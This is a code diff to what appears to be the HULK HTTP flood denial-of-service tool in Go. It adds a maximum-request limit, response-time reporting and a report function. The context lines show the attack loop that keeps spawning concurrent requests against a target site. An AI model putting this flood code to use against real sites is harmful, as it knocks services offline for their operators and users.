@@ -31,6 +31,7 @@ var mu *sync.Mutex
 var rtime time.Duration
 var reqs int64
 var startT time.Time
+var max int
 
 // const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
@@ -99,6 +100,7 @@ func main() {
 	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
+	flag.IntVar(&max, "max", -1, "Max number of requests, defaults to inf")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
 	flag.Parse()
 
@@ -140,15 +142,15 @@ func main() {
 		var (
 			err, sent int32
 		)
-		fmt.Println("In use               |\tResp OK |\tGot err")
+		fmt.Println("In use               |\tResp OK |\tGot err |\tTime (ms)")
 		for {
 			t := time.Now()
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
-			// if sent%10 == 0 {
-			fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d |\t%6vms", cur, maxproc, sent, err, float64(int64(rtime)/int64(time.Millisecond))/float64(reqs))
-			// }
+			if sent%10 == 0 || err%10 == 0 {
+				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d  |\t%6vms", cur, maxproc, sent, err, float64(int64(rtime)/int64(time.Millisecond))/float64(reqs))
+			}
 			switch <-ss {
 			case callExitOnErr:
 				updateTime(t)
@@ -169,14 +171,23 @@ func main() {
 				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
 				os.Exit(0)
 			}
+
+			if max != -1 && reqs > int64(max) {
+				report()
+			}
 		}
 	}()
 
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
+	report()
+}
+
+func report() {
 	fmt.Printf("\r\n-- Interrupted by user --        \n")
 	fmt.Printf("sent %d requests over %s\n", reqs, time.Since(startT).String())
+	os.Exit(0)
 }
 
 func updateTime(t time.Time) {
